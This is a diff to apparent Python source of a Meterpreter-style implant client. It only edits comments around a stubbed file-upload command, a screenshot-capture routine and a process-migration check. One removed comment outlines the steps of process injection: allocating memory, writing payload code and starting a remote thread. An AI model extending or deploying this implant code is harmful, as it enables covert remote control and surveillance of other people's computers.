@@ -516,8 +516,6 @@ class MeterpreterClient:
                 if len(args) < 2:
                     return "", 1, "Usage: upload <local_file_path> <remote_file_path>"
                 
-                # Note: This is a simplified version - in real implementation, 
-                # you'd need to handle file transfer differently
                 return "", 1, "Upload command not fully implemented - use execute to write files"
             
             elif cmd == 'screenshot':
@@ -574,8 +572,7 @@ class MeterpreterClient:
                             bmp_data[46:50] = (0).to_bytes(4, 'little')  # Colors used
                             bmp_data[50:54] = (0).to_bytes(4, 'little')  # Important colors
                             
-                            # Get pixel data (simplified - would need GetDIBits for full implementation)
-                            # For now, we'll use a workaround: save as BMP file then read it
+                            # Save as BMP file then read it (GetDIBits path not implemented)
                             import tempfile
                             with tempfile.NamedTemporaryFile(suffix='.bmp', delete=False) as tmp:
                                 tmp_path = tmp.name
@@ -716,14 +713,7 @@ class MeterpreterClient:
                         except OSError:
                             return "", 1, f"Process {target_pid} not found"
                     
-                    # Note: Full process migration requires injecting code into the target process
-                    # This is a simplified version that just validates the target
-                    # In a real implementation, you'd need to:
-                    # 1. Allocate memory in target process
-                    # 2. Write payload code to target process
-                    # 3. Create remote thread to execute payload
-                    # 4. Update socket connection to new process
-                    
+                    # Process migration requires injection into the target process (not implemented here).
                     return f"Migration to PID {target_pid} validated. Full migration requires process injection (not implemented in Python payload).\\n", 0, ""
                 except ValueError:
                     return "", 1, f"Invalid PID: {args[0]}"
